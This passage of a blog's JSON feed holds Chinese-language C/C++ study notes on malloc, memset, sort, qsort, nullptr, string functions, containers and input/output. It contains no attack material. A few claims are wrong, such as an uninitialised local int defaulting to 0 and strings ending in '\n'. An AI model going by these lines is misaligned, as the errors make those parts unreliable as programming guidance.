data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> aa<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"jun\"</span><span class=\"token punctuation\">;</span> cout<span class=\"token operator\">&lt;&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>aa<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span>endl<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 结果为 3</span></pre></td></tr></table></figure><h2 id=\"malloc\"><a class=\"anchor\" href=\"#malloc\">#</a> malloc( )</h2>\n<p>头文件 #include&lt;malloc.h&gt;</p>\n<p>malloc 内的参数是需要 &lt;font color='red'&gt; 动态分配的字节数 &lt;/font&gt;</p>\n<p>malloc 函数返回的是 void * 类型，必须通过 (type *) 来强制转换</p>\n<p>malloc（）是动态内存分配函数，用来向系统请求分配内存空间。当无法知道内存具体的位置时，想要绑定真正的内存空间，就要用到 malloc（）函数。因为 malloc 只管分配内存空间，并不能对分配的空间进行初始化，所以申请到的内存中的值是随机的，经常会使用 memset () 进行置 0 操作后再使用。</p>\n<p>与其配套的是 free（），当申请到的空间不再使用时，要用 free（）函数将内存空间释放掉，这样可以提高资源利用率，最重要的是 ---- 就是因为它可以申请内存空间，然后根据需要进行释放，才被称为 “动态内存分配”!</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>type <span class=\"token operator\">*</span>var_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>type<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 分配 128 个整型存储单元，并将这 128 个连续的整型存储单元的首地址存储到指针变量 p 中</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">double</span> <span class=\"token operator\">*</span>pd <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>　　</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 分配 12 个 double 型存储单元，并将首地址存储到指针变量 pd 中</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>pd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pd <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>　　</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>指针用完赋值<span class=\"token constant\">NULL</span>是一个很好的习惯。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>内存泄漏一般是指程序申请了一块内存，使用完后，没有及时将这块内存释放，从而导致程序占用大量内存。</pre></td></tr></table></figure><h2 id=\"memset\"><a class=\"anchor\" href=\"#memset\">#</a> memset( )</h2>\n<p>头文件 #include&lt;cstring&gt;</p>\n<p>memset 函数是内存赋值函数，用来给某一块内存空间进行赋值的。 其原型是：void* memset (void *_Dst, int _Val, size_t <em>Size)</em>——————sizeof (数组名)</p>\n<p>Dst 是目标起始地址，_Val 是要赋的值，_Size 是要赋值的字节数。</p>\n<p>memset 是逐字节拷贝的，给 char 以外的数组赋值时，只能初始化为 0 或者 - 1</p>\n<ul>\n<li>1、可以使用 memset 函数对 char 类型数组的元素进行赋值（0 值或非 0 值）。</li>\n<li>2、可以使用 memset 函数对非 char 类型数组的元素进行赋 0 值或 - 1，但不能使用 memset 函数直接对非 char 类型数组的元素赋非 0 值。这里的非 char 类型数组，是指数据类型大小不是 1 个字节的，比如 short、int、long、占用字节数大于 1 个字节的结构体等。</li>\n</ul>\n<pre><code class=\"language-c++\">memset(a,0,sizeof(a));\n</code></pre>\n<h2 id=\"常用sort\"><a class=\"anchor\" href=\"#常用sort\">#</a> 常用 sort ( )</h2>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-c++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<p><strong>基本使用办法</strong></p>\n<p>sort () 函数可以对给定区间所有元素进行排序。它有三个参数 &lt; font color='red'&gt;sort (begin, end, cmp)&lt;/font&gt;，其中 begin 为指向待 sort () 的数组的 &lt; font color='red'&gt; 第一个元素的指针 &lt;/font&gt;，end 为指向待 sort () 的数组的 &lt; font color='red'&gt; 最后一个元素的下一个位置的指针 &lt;/font&gt;，cmp 参数为排序准则，cmp 参数 &lt; font color='red'&gt; 可以不写（即为 sort（begin, end））&lt;/font&gt;，<strong>默认从小到大进行排序</strong>。如果我们想从大到小排序可以将 cmp 参数写为 greater&lt;int&gt;() 就是对 int 数组进行排序，当然 &lt;&gt; 中我们也可以写 double、long、float 等等。</p>\n<p>如果我们需要按照其他的排序准则，那么就需要我们自己定义一个 bool 类型的函数来传入:</p>\n<p>升序：第一个参数小于第二个该函数，返回 true。<br />\n降序：第一个参数大于第二个该函数，返回 true。</p>\n<p><strong>对一个整型数组进行从大到小排序：</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nint main()&#123;\n\tint num[10] = &#123;6,5,9,1,2,8,7,3,4,0&#125;;\n\tsort(num,num+10,greater&lt;int&gt;());\n\tfor(int i=0;i&lt;10;i++)&#123;\n\t\tcout&lt;&lt;num[i]&lt;&lt;&quot; &quot;;\n\t&#125;//输出结果:9 8 7 6 5 4 3 2 1 0\n\t\n\treturn 0;\n\t\n&#125; \n</code></pre>\n<p><strong>自定义排序准则</strong></p>\n<pre><code class=\"language-c++\">//按照每个数的个位进行从大到小排序\n#include&lt;iostream&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nbool cmp(int x,int y)&#123;\n\treturn x % 10 &gt; y % 10;\n&#125;\n\nint main()&#123;\n\tint num[10] = &#123;65,59,96,13,21,80,72,33,44,99&#125;;\n\tsort(num,num+10,cmp);\n\tfor(int i=0;i&lt;10;i++)&#123;\n\t\tcout&lt;&lt;num[i]&lt;&lt;&quot; &quot;;\n\t&#125;//输出结果：59 99 96 65 44 13 33 72 21 80\n\t\n\treturn 0;\n\t\n&#125; \n</code></pre>\n<p><strong>对结构体进行排序</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;string&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nstruct Student&#123;\n\tstring name;\n\tint score;\n\tStudent() &#123;&#125;\n\tStudent(string n,int s):name(n),score(s) &#123;&#125;\n&#125;;\n\nbool cmp_score(Student x,Student y)&#123;\n\treturn x.score &gt; y.score;\n&#125;\n\nint main()&#123;\n\tStudent stu[3];\n\tstring n;\n\tint s;\n\tfor(int i=0;i&lt;3;i++)&#123;\n\t\tcin&gt;&gt;n&gt;&gt;s;\n\t\tstu[i] = Student(n,s);\n\t&#125;\n\t\n\tsort(stu,stu+3,cmp_score);\n\t\n\tfor(int i=0;i&lt;3;i++)&#123;\n\t\tcout&lt;&lt;stu[i].name&lt;&lt;&quot; &quot;&lt;&lt;stu[i].score&lt;&lt;endl;\n\t&#125;\n\t\n\treturn 0;\n&#125;\n</code></pre>\n<h2 id=\"qsort\"><a class=\"anchor\" href=\"#qsort\">#</a> qsort( )</h2>\n<p>头文件 #include&lt;cstdlib&gt;</p>\n<p>“比较函数” 的原型应是：int 函数名 (const void * elem1, const void * elem2)</p>\n<p>/* 参数列表是两个空指针，现在他要去指向你的数组元素。所以转型为你当前的类型，然后取值。</p>\n<p>升序排列时：</p>\n<p>若第一个参数指针指向的 “值”<strong> 大于</strong>第二个参数指针指向的 “值”，则返回正；<br />\n若第一个参数指针指向的 “值”<strong> 等于</strong>第二个参数指针指向的 “值”，则返回零；<br />\n若第一个参数指针指向的 “值”<strong> 小于</strong>第二个参数指针指向的 “值”，则返回负。</p>\n<p>降序排列时，则刚好相反。</p>\n<p>*/</p>\n<pre><code class=\"language-c++\">用法示例：\n#include&lt;cstdlib&gt;\nint cmpfunc (const void * a, const void * b) &#123;\n   return *(int *)a - *(int *)b;//升序排序\n   return *(int *)b - *(int *)a; //降序排序\n&#125;\nqsort(nums, numsSize, sizeof(int), cmpfunc);//写在需要进行排序操作的函数里\n</code></pre>\n<h2 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算</h2>\n<p>标准运算符，不用头文件</p>\n<p>转换为二进制后，对每一位进行运算，生成新的数</p>\n<p>&amp; 与</p>\n<pre><code class=\"language-c++\">2的幂：若 n = 2^x，恒有 (n &gt; 0) &amp;&amp; (n &amp; (n - 1)) == 0\n4的幂：若 n = 4^x，恒有 (n &gt; 0) &amp;&amp; (n &amp; (n - 1)) == 0 &amp;&amp; (n &amp; 0xAAAAAAAA) ==0\n- n二进制最高位为 1，其余所有位为 0；\n- n - 1二进制最高位为 0，其余所有位为 1；\n</code></pre>\n<dl>\n<dt>| 或</dt>\n<dd>非</dd>\n</dl>\n<p>^ 异或</p>\n<p>&gt;&gt; 右移，相当于除 2</p>\n<p>&lt;&lt; 左移，相当于乘 2</p>\n<h2 id=\"calloc\"><a class=\"anchor\" href=\"#calloc\">#</a> calloc</h2>\n<p>头文件 #include&lt;cstdlib&gt;</p>\n<p>分配所需的内存空间，并返回一个指向它的指针。<strong>malloc</strong> 和 <strong>calloc</strong> 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p>\n<p>不需要 memset 置 0，calloc = malloc+memset ，但是推荐 calloc</p>\n<pre><code class=\"language-c++\"> void *calloc(size_t nitems, size_t size)\n nitems -- 要被分配的元素个数。\n size -- 元素的大小。\n a = (int*)calloc(n, sizeof(int));\n例：int *arr = (int *) calloc(10, sizeof(int))\n</code></pre>\n<h2 id=\"null-和-nullptr\"><a class=\"anchor\" href=\"#null-和-nullptr\">#</a> NULL 和 nullptr</h2>\n<p>C<ins>11 版本中新加入 nullptr，解决 NULL 表示空指针在 C</ins> 中具有二义性</p>\n<p>如：ListNode* l1 = nullptr</p>\n<p>c 和 c++ 对比阐述</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c语言中<span class=\"token constant\">NULL</span>为空指针</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">NULL</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span>  <span class=\"token operator\">*</span>pi <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pc <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C语言中把空指针赋给<span class=\"token keyword\">int</span>和<span class=\"token keyword\">char</span>指针的时候，发生了隐式类型转换，把<span class=\"token keyword\">void</span>指针转换成了相应类型的指针。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>C语言中，<span class=\"token keyword\">void</span> 类型的变量可以赋值给任意类型的指针，<span class=\"token keyword\">void</span>也可以被任意类型的指针赋值，两个方向都不会报错。</pre></td></tr></table></figure><pre><code class=\"language-c++\">C++是强类型语言，void*是不能隐式转换成其他类型的指针的\n#ifdef __cplusplus\n#define NULL 0                 NULL为0\n#else\n#define NULL ((void *)0)       用作空指针可能是为了兼容C，迫于无奈\n#endif\nC++具有更严格的类型检查，void 类型的变量不能赋值给任意类型的指针，但void可以被任意类型的指针赋值(void* 是万能指针)。    \n</code></pre>\n<p><strong>总结</strong></p>\n<p>c++ 中 NULL 为 0 ，nullptr 为空指针</p>\n<p>没有 c++11 如何解决？</p>\n<pre><code class=\"language-c++\">const class nullptr_t\n&#123;\npublic:\n    template&lt;class T&gt;\n    inline operator T*() const\n        &#123; return 0; &#125;\n \n    template&lt;class C, class T&gt;\n    inline operator T C::*() const\n        &#123; return 0; &#125;\n \nprivate:\nvoid operator&amp;() const;\n&#125; nullptr = &#123;&#125;;\n</code></pre>\n<h2 id=\"push_back\"><a class=\"anchor\" href=\"#push_back\">#</a> push_back( )</h2>\n<ul>\n<li>\n<p>push_back () 在 Vector 最后添加一个元素（参数为要插入的值），位置为当前最后一个元素的下一个元素</p>\n<pre><code class=\"language-c++\">//在vec尾部添加10\nvector&lt;int&gt; vec;\nvec.push_back(10);\n</code></pre>\n</li>\n<li>\n<p>在 string 的最后插入一个字符</p>\n<pre><code class=\"language-c++\">string str;\nstr.push_back('d');\n</code></pre>\n</li>\n</ul>\n<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> reverse( )</h2>\n<p>实现翻转数组，字符串，向量</p>\n<p>std :: reverse 反转了 [first，<strong>last</strong>）范围内的元素</p>\n<p>注意 last 是开区间，所以尾部要比需要反转的最后一个元素地址<strong>大 1</strong>（数组）</p>\n<p>1、翻转数组</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//使用方法\nreverse(a, a+n);//n为数组中的元素个数\na为指针首地址，a+k为数组第k+1个元素的地址，a+n为数组第n+1的地址\n</code></pre>\n<p>2、翻转字符串</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//用法为\nreverse(str.begin(), str.end());\n</code></pre>\n<p>3、翻转向量</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//用法\nreverse(vec.begin(), vec.end());\n</code></pre>\n<h2 id=\"swap\"><a class=\"anchor\" href=\"#swap\">#</a> swap( )</h2>\n<pre><code class=\"language-c++\">该函数在 &lt;algorithm&gt; 头文件中声明。\n交换位置\nswap(a, b);\n</code></pre>\n<h2 id=\"uhash哈希函数t217\"><a class=\"anchor\" href=\"#uhash哈希函数t217\">#</a> uhash—— 哈希函数（T217）</h2>\n<p>uhash 以宏的方式定义了对哈希函数的操作函数</p>\n<pre><code class=\"language-c++\">#include &quot;uthash.h&quot;\nstruct hashTable &#123;\n    int id;                    /* key */\n    UT_hash_handle hh;         /* makes this structure hashable */\n&#125;;\nstruct hashTable *users = NULL;    /* important! initialize to NULL */\n</code></pre>\n<h2 id=\"abs\"><a class=\"anchor\" href=\"#abs\">#</a> abs( )</h2>\n<p>求绝对值函数</p>\n<p>头文件 #include&lt;cmath&gt;</p>\n<p>c++ 中 abs () 可以支持整数、浮点数和复数的求绝对值运算</p>\n<pre><code class=\"language-c++\">整型：\nint abs(int i)  //返回整型参数i的绝对值 \n\n复数（complex）：\ndouble cabs(struct complex znum)  //返回复数znum的绝对值  \n\n双精度浮点型：\ndouble fabs(double x)  //返回双精度参数x的绝对值  \n\n长整型：\nlong labs(long n)  //返回长整型参数n的绝对值 \n</code></pre>\n<h2 id=\"pow-函数\"><a class=\"anchor\" href=\"#pow-函数\">#</a> pow ( ) 函数</h2>\n<pre><code class=\"language-c++\">#include&lt;cmath&gt; //必要头文件\npow(x,y); //x的y次方\n一般来说的正确用法是pow(int,double)\n如：pow(2,2.0)\n</code></pre>\n<h2 id=\"增强for循环\"><a class=\"anchor\" href=\"#增强for循环\">#</a> 增强 for 循环</h2>\n<pre><code class=\"language-c++\">for(声明语句 : 表达式)\n&#123;\n   //代码句子\n   //声明语句：声明新的局部变量，与数组元素的类型匹配，用作输出或传值\n   //表达式：访问的数组名\n&#125;\n例：for (char ch: s)\n</code></pre>\n<h2 id=\"cctype函数\"><a class=\"anchor\" href=\"#cctype函数\">#</a> cctype 函数</h2>\n<p><strong>#include&lt;cctype&gt;// 头文件</strong></p>\n<p><strong>isalnum( )</strong></p>\n<pre><code class=\"language-c++\">判断一个字符是否是字母或者（十进制）数字，若为字母或者数字，则返回True(非0值)，否者返回False(0)\nisalnum (c)\n#include&lt;cctype&gt;//头文件\n</code></pre>\n<p><strong>isalpha( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个字母。如果是字母，返回true，否则返回false。返回true的范围正则可表示为：[a-z，A-Z]。\nisalpha (c);\n</code></pre>\n<p><strong>isblank( )</strong></p>\n<pre><code class=\"language-c++\">isblank()将空白字符视为制表符(“ \\ t”)和空格字符(“”)。\n检查字符c是否为空白字符。空白字符是用于分隔文本行内的单词的空格字符。如果是，则返回true；如果不是，则返回false。\n空格字符的ascii值是32.空格字符用正则表达式为：\\s\nisblank (c);\n</code></pre>\n<p><strong>isspace( )</strong></p>\n<pre><code class=\"language-c++\">isspace()考虑空格字符：('')-空格，('\\ t')-水平制表符，('\\ n')-换行符，('\\ v')-垂直制表符，('\\ f')-提要，( '\\ r')-回车\n如果是，则返回true；如果不是，则返回false。\nisspace(c);\n</code></pre>\n<p><strong>isdigit( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个十进制数字字符。如果是十进制数字字符，返回true，否则返回false。十进制数字字符用正则表达式为：[0-9]\nisdigit (c);\n</code></pre>\n<p><strong>islower( )</strong></p>\n<pre><code>判断参数“c”是否是一个小写字母。如果是小写字母，返回true，否则返回false。小写字母用正则表达式为：[a-z]\nislower (c);\n</code></pre>\n<p><strong>isupper( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个大写字母。如果是大写字母，返回true，否则返回false。大写字母用正则表达式为：[A-Z]\nisupper (c);\n</code></pre>\n<p><strong>isxdigit( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个十六进制数字字符。如果是十六进制数字字符，返回true，否则返回false。十六进制数字字符用正则表达式为：[a-f0-9A-F]。通常x在代码中有代表十六进制的含义，因此函数名为isxdigit。它比十进制数字字符多了小写a到f，大写A到F。因为十六进制表示时，是不区分大小写的，a和A表示的十六进制值都是十进制的10，所以十六进制数字字符有小写的abcdef,也包含大写的ABCDEF。\n\nisxdigit (c);\n</code></pre>\n<p><strong>tolower ()、toupper () 函数</strong></p>\n<pre><code class=\"language-c++\">将给定一个字符转换为小写\ntolower(ch);\n将给定一个字符转换为大写\ntoupper(ch);\n</code></pre>\n<h2 id=\"string类\"><a class=\"anchor\" href=\"#string类\">#</a> String 类</h2>\n<pre><code class=\"language-c++\">#include &lt;string&gt; //注意这里不是string.h，这是C字符串头文件\nusing namespace std;\n</code></pre>\n<p><strong>std::string 中的反向迭代器 rbegin（）、rend（）</strong></p>\n<pre><code class=\"language-c++\">rbegin()：表示string字符串的倒数第一个字符\nrend()：表示string字符串的正数第一个字符\nstring sgood_rev(sgood.rbegin(), sgood.rend());//定义一个新的翻转string类\n</code></pre>\n<p><strong>size</strong></p>\n<p>求 string 长度</p>\n<pre><code class=\"language-c++\">string.size(); 等价 string.length();\n</code></pre>\n<h2 id=\"stack栈用法\"><a class=\"anchor\" href=\"#stack栈用法\">#</a> stack 栈用法</h2>\n<pre><code class=\"language-c++\">#include&lt;stack&gt;//头文件\nstack&lt;int&gt; q;\t//以int型为例\nint x;\n//常用操作：\nq.push(x);\t\t//将x压入栈顶,括号内需要有变量\nq.top();\t\t//返回栈顶的元素\nq.pop();\t\t//删除栈顶的元素\nq.size();\t\t//返回栈中元素的个数\nq.empty();\t\t//检查栈是否为空,若为空返回true,否则返回false\n</code></pre>\n<h2 id=\"unordered_map-容器\"><a class=\"anchor\" href=\"#unordered_map-容器\">#</a> unordered_map 容器</h2>\n<p><em>无序的 map 容器</em></p>\n<pre><code class=\"language-c++\">#include &lt;unordered_map&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>以键值对（pair 类型）的形式存储数据，存储的各个键值对的键互不相同且不允许被修改</p>\n</li>\n<li>\n<p>使用 &lt;font color='red'&gt;[ ] 操作 &lt;/font &gt; 符来访问 key 值对应的 value 值，pairs [ch]</p>\n</li>\n</ul>\n<h2 id=\"exp-log\"><a class=\"anchor\" href=\"#exp-log\">#</a> exp( )、log( )</h2>\n<pre><code class=\"language-c++\">头文件：#include&lt;cmath&gt;\nexp(x):求e的x次方\nlog(x):求e为底，x的对数\n</code></pre>\n<h2 id=\"指定序列生成不同的排列\"><a class=\"anchor\" href=\"#指定序列生成不同的排列\">#</a> 指定序列生成不同的排列</h2>\n<pre><code class=\"language-c++\">头文件：#include&lt;algorithm&gt;\n    next_permutation按照字母顺序生成给定序列的下一个较大的序列，直到整个序列为减序位置\n    prev_premutation按照字母顺序生成给定序列的上一个较小的序列\n    二者原理相同，仅遍历顺序相反。\n</code></pre>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/c++%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/",
            "url": "http://yoursite.com/Algorithm/c++%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/",
            "title": "c++语法基础",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"简单顺序结构\"><a class=\"anchor\" href=\"#简单顺序结构\">#</a> 简单顺序结构</h1>\n<h2 id=\"main\"><a class=\"anchor\" href=\"#main\">#</a> main( )</h2>\n<p>最新版的 c++<strong> 不允许</strong>使用 void main ( )</p>\n<h2 id=\"printf格式\"><a class=\"anchor\" href=\"#printf格式\">#</a> printf 格式</h2>\n<pre><code class=\"language-c++\">%05d    宽度为5，左端自动补4个0\n%-5d    宽度为5，右端自动补空格\n%5.1f   保留小数点一位，宽度为5\n</code></pre>\n<h1 id=\"循环\"><a class=\"anchor\" href=\"#循环\">#</a> 循环</h1>\n<h2 id=\"增强for循环\"><a class=\"anchor\" href=\"#增强for循环\">#</a> 增强 for 循环</h2>\n<p>范围遍历</p>\n<pre><code class=\"language-c++\">string s = &quot;HELLO WORLD&quot;;\nfor(变量类型  新的遍历变量名 ： 被遍历的变量)\nfor(char c : s) cout &lt;&lt; c &lt;&lt; endl;\n//取地址改变字符串内容\nfor(char &amp;c : s) c = 'a';\n//auto类型\n//自动类型推导，但是必须初始化\nfor(auto c : s)//用于类型比较长的时候\n</code></pre>\n<h1 id=\"数组\"><a class=\"anchor\" href=\"#数组\">#</a> 数组</h1>\n<h2 id=\"分配内存\"><a class=\"anchor\" href=\"#分配内存\">#</a> 分配内存</h2>\n<p>指针数组初始化需要提前分配内存，并置 0，<strong>calloc</strong></p>\n<p>一般数组（已经设置数组边界值）已经分配好内存，只需置 0，<strong>memset</strong></p>\n<h2 id=\"获取数组长度\"><a class=\"anchor\" href=\"#获取数组长度\">#</a> 获取数组长度</h2>\n<ul>\n<li>\n<p>字符串数组长度：strlen ( )</p>\n</li>\n<li>\n<p>万能方法：</p>\n<p>sizeof (a) /sizeof (a [0]) —— 使用 sizeof 关键字</p>\n<p>注意：因为字符串结尾处还有一个‘ \\n ’字符，所以使用该方法时会比真实长度大了 1，即为 strlen ( ) + 1</p>\n</li>\n</ul>\n<h2 id=\"定义变量的默认值\"><a class=\"anchor\" href=\"#定义变量的默认值\">#</a> 定义变量的默认值</h2>\n<pre><code class=\"language-c++\">int n;//默认值为0\n</code></pre>\n<h1 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串</h1>\n<h2 id=\"用地址调用数组元素\"><a class=\"anchor\" href=\"#用地址调用数组元素\">#</a> 用地址调用数组元素</h2>\n<pre><code class=\"language-c++\">*(a+k);/*调用数组第k+1的元素*/\n</code></pre>\n<h2 id=\"ascii码值\"><a class=\"anchor\" href=\"#ascii码值\">#</a> ASCII 码值</h2>\n<p>每个常用字符都对应一个 - 128~127 的数字</p>\n<p>空格 &quot; &quot; 是 32</p>\n<p><code>’0’-‘9’是48-57</code></p>\n<p><code>’A’-‘Z’ 是65~90</code></p>\n<p><code>’a’-‘z’是97-122</code></p>\n<p>字符可以<strong>参与运算</strong>，需要用 **' 单引号 '<strong>，运算时会将其当做</strong>整数 **</p>\n<pre><code class=\"language-c++\">'1' != 1\n</code></pre>\n<h2 id=\"字符数组\"><a class=\"anchor\" href=\"#字符数组\">#</a> 字符数组</h2>\n<p>字符数组的长度至少要比字符串的长度<strong>多 1</strong> (必须要有一个空间存放 '\\0')</p>\n<p>字符串就是字符数组加上<strong>结束符’\\0’</strong></p>\n<p>Difference：</p>\n<pre><code class=\"language-c++\">/*单个字符用单引号'', 字符串用双引号&quot;&quot;*/\nchar a[] = &#123;'C', '+', '+'&#125;;//列表初始化，没有空字符\nchar a[] = &#123;'C', '+', '+', '\\0'&#125;;//列表初始化，含有空字符\nchar a[] = &quot;C++&quot;;//列表初始化，自动添加空字符'\\0'\n</code></pre>\n<h2 id=\"字符串输入\"><a class=\"anchor\" href=\"#字符串输入\">#</a> 字符串输入</h2>\n<h3 id=\"scanf\"><a class=\"anchor\" href=\"#scanf\">#</a> scanf</h3>\n<p><strong>过滤空格</strong></p>\n<p>% s 格式的输入不需要加上 &amp;，因为<strong>字符串的数组名</strong>就是指针，指向首地址（！仅限字符串数组！）</p>\n<p>遇到空格结束，不会过滤回车</p>\n<pre><code class=\"language-c++\">//从数组下标唯一1开始输入,输出类似\nscanf(&quot;%s&quot;, s + 1);\ncin &gt;&gt; s + 1;\n//字符串用空格或回车隔开即可\nscanf(&quot;%s%s&quot;, s1, s2);\n//过滤回车\nscanf(&quot;\\n%s&quot;,s);\n</code></pre>\n<h3 id=\"cin\"><a class=\"anchor\" href=\"#cin\">#</a> cin</h3>\n<p><strong>过滤空格</strong></p>\n<p>cin &gt;&gt; 字符串首地址，遇到空格或回车会停止，只能输入没有空格的字符串</p>\n<h3 id=\"cingetline\"><a class=\"anchor\" href=\"#cingetline\">#</a> cin.getline</h3>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<pre><code class=\"language-c++\">两个头文件\n&lt;string&gt;\n&lt;iostream&gt;\n</code></pre>\n<p>cin.getline(s, 100);</p>\n<p>cin.getline (字符串首地址，最多读入长度)；</p>\n<p>遇到 ** 回车 '\\r'** 结束，可以有空格</p>\n<h3 id=\"fgets容易出错\"><a class=\"anchor\" href=\"#fgets容易出错\">#</a> fgets（容易出错）</h3>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<pre><code class=\"language-c++\">char s[100];\n//fgets(s, 100, stdin)\n//fgets(字符串首地址，最多读入字符数，读入的文件名（一般为stdin）)\n</code></pre>\n<ul>\n<li>\n<p>该函数从 <code>stream</code>  所指的文件中读取以 <code>'\\n'</code>  结尾的一行（包括 <code>'\\n'</code>  在内）存到缓冲区 <code>s</code>  中，并且在该行末尾添加一个  <code>'\\0'</code>  组成完整的字符串。</p>\n</li>\n<li>\n<p><strong> <code>fgets()</code>  函数的最大读取大小是其 “ <code>第二个参数减1</code> ”，这是由于字符串是以 <code>’\\0’</code> 为结束符的</strong></p>\n</li>\n<li>\n<p><strong>输入回车时会读入 '\\n' ，输入 <code>n</code>  个字符按下回车输入， <code>fgets()</code>  存储进第一个参数指定内存地址的是 <code>n+2</code>  个字节</strong></p>\n</li>\n</ul>\n<h2 id=\"字符串输出\"><a class=\"anchor\" href=\"#字符串输出\">#</a> 字符串输出</h2>\n<h3 id=\"puts\"><a class=\"anchor\" href=\"#puts\">#</a> puts</h3>\n<p>puts (字符串数组名)；</p>\n<p><code>puts输出自带有换行</code></p>\n<h3 id=\"printf\"><a class=\"anchor\" href=\"#printf\">#</a> printf</h3>\n<p>printf(&quot;%s&quot;, s);</p>\n<h2 id=\"常用操作\"><a class=\"anchor\" href=\"#常用操作\">#</a> 常用操作</h2>\n<pre><code class=\"language-c++\">头文件：&lt;cstring&gt;\n</code></pre>\n<h3 id=\"strlen\"><a class=\"anchor\" href=\"#strlen\">#</a> strlen()</h3>\n<p>strlen (str)，求字符串的长度</p>\n<p><strong>一般提前用新变量保存好字符串的长度再进入循环</strong></p>\n<h3 id=\"strcmp\"><a class=\"anchor\" 